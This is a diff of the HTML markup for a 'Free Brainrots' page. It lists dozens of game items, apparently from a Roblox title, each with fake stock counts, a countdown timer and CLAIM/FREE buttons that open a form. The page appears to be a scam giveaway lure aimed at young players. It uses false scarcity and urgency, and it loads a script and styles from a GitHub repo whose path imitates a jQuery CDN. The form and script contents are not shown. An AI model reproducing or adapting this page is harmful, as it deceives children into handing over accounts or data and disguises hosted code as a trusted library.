@@ -1,764 +1,259 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Brainrots</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/styles.css">
-  <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/3.6.3.min.js"></script>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Brainrots</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/img@main/Ty6r5.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/oppa.css" />
+
 </head>
 <body>
-
-  <div class="overlay"></div>
-
-  <div class="shop-container">
-    <div class="shop-header">
-      <span>Free Brainrots  <span id="timer" class="countdown">20:13</span></span>
-      <div class="header-buttons">
-        <button class="restock-btn">Restock</button>
-        <button class="close-btn" onclick="goBack()">X</button>
-      </div>
-    </div>
-
-    <div class="cards-wrapper" id="cardsWrapper">
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://i.postimg.cc/4d0VGXFJ/Whats-App-Image-2025-11-08-at-9-40-52-PM-removebg-preview.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Fragrama and Chocrama</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Fragrama and Chocrama')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Fragrama and Chocrama')">FREE</span>
-            <span class="price-victor" onclick="openForm('Fragrama and Chocrama')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://i.postimg.cc/hv3xScyG/Untitled-design.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Los Spaghettis</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Los Spaghettis')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Los Spaghettis')">FREE</span>
-            <span class="price-victor" onclick="openForm('Los Spaghettis')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-             <div class="card">
-        <div class="card-image-container">
-          <img src="https://static.wikia.nocookie.net/stealabr/images/9/9b/Cooki_and_milki.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Cooki and Milki</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Cooki and Milki')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Cooki and Milki')">FREE</span>
-            <span class="price-victor" onclick="openForm('Cooki and Milki')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-                   <div class="card">
-        <div class="card-image-container">
-          <img src="https://static.wikia.nocookie.net/stealabr/images/d/d6/Losmoneypug.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Los Puggies</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Los Puggies')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Los Puggies')">FREE</span>
-            <span class="price-victor" onclick="openForm('Los Puggies')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/CapitanoMoby.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Capitano Moby</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Capitano Moby')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Capitano Moby')">FREE</span>
-            <span class="price-victor" onclick="openForm('Capitano Moby')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-              <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Guest_666.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Guest 666</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Guest 666')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Guest 666')">FREE</span>
-            <span class="price-victor" onclick="openForm('Guest 666')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-        <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/1x1x1x1.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">1x1x1x1</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('1x1x1x1')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('1x1x1x1')">FREE</span>
-            <span class="price-victor" onclick="openForm('1x1x1x1')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-  <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaTacoCombinasion.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">La Taco Combinasion</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('La Taco Combinasion')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('La Taco Combinasion')">FREE</span>
-            <span class="price-victor" onclick="openForm('La Taco Combinasion')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Casa_Booo.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">La Casa Boo</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('La Casa Boo')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('La Casa Boo')">FREE</span>
-            <span class="price-victor" onclick="openForm('La Casa Boo')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-        <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Gemini-Generated.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Headless Horseman</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Headless Horseman')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Headless Horseman')">FREE</span>
-            <span class="price-victor" onclick="openForm('Headless Horseman')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Chipso_and_queso.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Chipso and Queso</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Chipso and Queso')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Chipso and Queso')">FREE</span>
-            <span class="price-victor" onclick="openForm('Chipso and Queso')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Meowl.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Meowl</div>
-          <div class="rarity" id="coloredText">OG</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Meowl')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Meowl')">FREE</span>
-            <span class="price-victor" onclick="openForm('Meowl')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/mie.png"style="width:80px; height:80px;">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Mieteteira Bicicleteira</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Mieteteira Bicicleteira')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Mieteteira Bicicleteira')">FREE</span>
-            <span class="price-victor" onclick="openForm('Mieteteira Bicicleteira')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Spooky-and-Pumpky.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Spooky and Pumpky</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x24 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Spooky and Pumpky')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Spooky and Pumpky')">FREE</span>
-            <span class="price-victor" onclick="openForm('Spooky and Pumpky')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-        <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Mobilis.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Los Mobilis</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x24 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Los Mobilis')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Los Mobilis')">FREE</span>
-            <span class="price-victor" onclick="openForm('Los Mobilis')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-                         <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Eviledon.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Eviledon</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x24 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Eviledon')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Eviledon')">FREE</span>
-            <span class="price-victor" onclick="openForm('Eviledon')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-                         <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/New-La-Grande.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">La Spooky Grande</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x24 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('La Spooky Grande')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('La Spooky Grande')">FREE</span>
-            <span class="price-victor" onclick="openForm('La Spooky Grande')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-        <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/BurguroandFryuro.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Burguro and Fryuro</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x24 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Burguro and Fryuro')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Burguro and Fryuro')">FREE</span>
-            <span class="price-victor" onclick="openForm('Burguro and Fryuro')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-             <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los67.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Los 67</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x4 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Los 67')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Los 67')">FREE</span>
-            <span class="price-victor" onclick="openForm('Los 67')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-            <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Strawberry-Elephant.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Strawberry Elephant</div>
-          <div class="rarity" id="coloredText">OG</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Strawberry Elephant')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Strawberry Elephant')">FREE</span>
-            <span class="price-victor" onclick="openForm('Strawberry Elephant')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-        <div class="card">
-        <div class="card-image-container">
-        <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/StrawberryElephantog.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Strawberry Elephant</div>
-          <div class="rarity" id="coloredText">OG</div>
-          <div class="stock">x24 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Strawberry Elephant')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Strawberry Elephant')">FREE</span>
-            <span class="price-victor" onclick="openForm('Strawberry Elephant')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-            <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/ChillinChili1.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Chillin Chili</div>
-          <div class="rarity" id="coloredText">OG</div>
-          <div class="stock">x3 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Chillin Chili')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Chillin Chili')">FREE</span>
-            <span class="price-victor" onclick="openForm('Chillin Chili')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tang-Tnag-Keletang.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Tang Tnag Keletang</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x24 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Tang Tnag Keletang')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Tang Tnag Keletang')">FREE</span>
-            <span class="price-victor" onclick="openForm('Tang Tnag Keletang')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Money-Money-Puggy-Leak.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Money Money Puggy</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x13 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Money Money Puggy')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Money Money Puggy')">FREE</span>
-            <span class="price-victor" onclick="openForm('Money Money Puggy')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Noo-My-Exam.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Noo My Examen</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x23 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Noo My Examen')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Noo My Examen')">FREE</span>
-            <span class="price-victor" onclick="openForm('Noo My Examen')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://static.wikia.nocookie.net/stealabr/images/1/14/Ketchuru.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Ketchuru & Musturu</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Ketchuru & Musturu')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Ketchuru & Musturu')">FREE</span>
-            <span class="price-victor" onclick="openForm('Ketchuru & Musturu')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-                 <div class="card">
-        <div class="card-image-container">
-          <img src="https://tr.rbxcdn.com/180DAY-b14aa19aee59dcd2e3fdc474bc8ed42e/420/420/Hat/Webp/noFilter">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Dragon Cannelloni</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Dragon Cannelloni')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Dragon Cannelloni')">FREE</span>
-            <span class="price-victor" onclick="openForm('Dragon Cannelloni')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-                 <div class="card">
-        <div class="card-image-container">
-          <img src="https://static.wikia.nocookie.net/stealabr/images/d/d2/Blackhole_Bomb.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Blackhole Bomb</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Blackhole Bomb')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Blackhole Bomb')">FREE</span>
-            <span class="price-victor" onclick="openForm('Blackhole Bomb')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-                 <div class="card">
-        <div class="card-image-container">
-          <img src="https://static.wikia.nocookie.net/stealabr/images/7/7f/Alien_Slap.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Alien Slap</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Alien Slap')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Alien Slap')">FREE</span>
-            <span class="price-victor" onclick="openForm('Alien Slap')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-                 <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tictac-Sahur.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Tictac Sahur</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Tictac Sahur')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Tictac Sahur')">FREE</span>
-            <span class="price-victor" onclick="openForm('Tictac Sahur')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-                 <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Mariachi-Corazoni.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Mariachi Corazoni</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Mariachi Corazoni')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Mariachi Corazoni')">FREE</span>
-            <span class="price-victor" onclick="openForm('Mariachi Corazoni')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>         
-      <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/To-To-To-Sahur.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">To To Sahur</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('To To To Sahur')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('To To To Sahur')">FREE</span>
-            <span class="price-victor" onclick="openForm('To To To Sahur')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-            <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Los-Tacoritas.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Los Tacoritas </div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Los Tacoritas')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Los Tacoritas')">FREE</span>
-            <span class="price-victor" onclick="openForm('Los Tacoritas')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-            <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LasahurCombinasion.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Sahur Combinasion</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Los Tacoritas')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Los Tacoritas')">FREE</span>
-            <span class="price-victor" onclick="openForm('Los Tacoritas')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-               <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/Tacorita_Bicicleta_.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Tacorita Bicicleta</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Tacorita Bicicleta')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Tacorita Bicicleta')">FREE</span>
-            <span class="price-victor" onclick="openForm('Tacorita Bicicleta')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/SIX_SEVEN.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">SIX SEVEN</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('SIX SEVEN')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('SIX SEVEN')">FREE</span>
-            <span class="price-victor" onclick="openForm('SIX SEVEN')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LosChicleteiritas.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Los Chicleteiritas</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Los Chicleteiritas')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Los Chicleteiritas')">FREE</span>
-            <span class="price-victor" onclick="openForm('Los Chicleteiritas')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LaExtinctGrande.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">La Extinct Grande</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('La Extinct Grande')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('La Extinct Grande')">FREE</span>
-            <span class="price-victor" onclick="openForm('La Extinct Grande')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-      
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/ExtinctMatteo.webp">
-        </div>
-        <div class="card-info">
-          <div class="card-title">Extinct Matteo</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('Extinct Matteo')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('Extinct Matteo')">FREE</span>
-            <span class="price-victor" onclick="openForm('Extinct Matteo')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
-          </div>
-        </div>
-      </div>
-       <div class="card">
-        <div class="card-image-container">
-          <img src="https://cdn.jsdelivr.net/gh/monorolls/sas@main/LasSis.png">
-        </div>
-        <div class="card-info">
-          <div class="card-title">LasSis</div>
-          <div class="rarity" id="coloredText">Secret</div>
-          <div class="stock">x63 in stock</div>
-          <div class="prices">
-            <span class="price-green" onclick="openForm('LasSis')">CLAIM</span>
-            <span class="price-purple" onclick="openForm('LasSis')">FREE</span>
-            <span class="price-victor" onclick="openForm('LasSis')">
-              <img src="https://cdn.jsdelivr.net/gh/monorolls/zero@main/gift.png" alt="Gift" style="width:22px; height:22px; vertical-align:middle;">
-            </span>
